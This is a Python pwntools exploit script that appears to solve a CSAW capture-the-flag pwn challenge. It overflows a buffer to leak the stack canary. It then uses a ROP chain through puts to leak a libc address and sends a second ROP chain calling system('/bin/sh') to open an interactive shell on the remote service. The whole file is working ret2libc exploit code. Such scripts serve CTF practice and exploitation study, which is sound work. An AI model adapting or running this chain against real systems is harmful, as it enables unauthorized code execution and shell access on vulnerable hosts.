#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn.chal.csaw.io', 3764)
libc = ELF('libc-2.23.so')

context.arch = 'amd64'

puts_plt = 0x4008d0
puts_got = 0x602018
main = 0x400a96
pop_rdi_ret = 0x400ea3

def feed(food):
    r.sendlineafter('>>', '1')
    r.sendafter('>>', food)

def review():
    r.sendlineafter('>>', '2')

def mine():
    r.sendlineafter('>>', '3')

# leak canary
feed('A'*169)
review()
r.recvuntil('A'*169)
canary = u64('\x00' + r.recvn(7))
log.success('canary: ' + hex(canary))

rop1 = flat(
    pop_rdi_ret,
    puts_got,
    puts_plt,
    main 
)

# leak libc address
feed('A'*168 + p64(canary) + 'A'*8 + rop1)
mine()
r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...\n')
libc_base = u64(r.recvn(6) + '\x00'*2) - libc.symbols['puts']
log.success('libc base: ' + hex(libc_base))
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

rop2 = flat(
    pop_rdi_ret,
    binsh,
    system
)

feed('A'*168 + p64(canary) + 'A'*8 + rop2)
mine()

r.interactive()
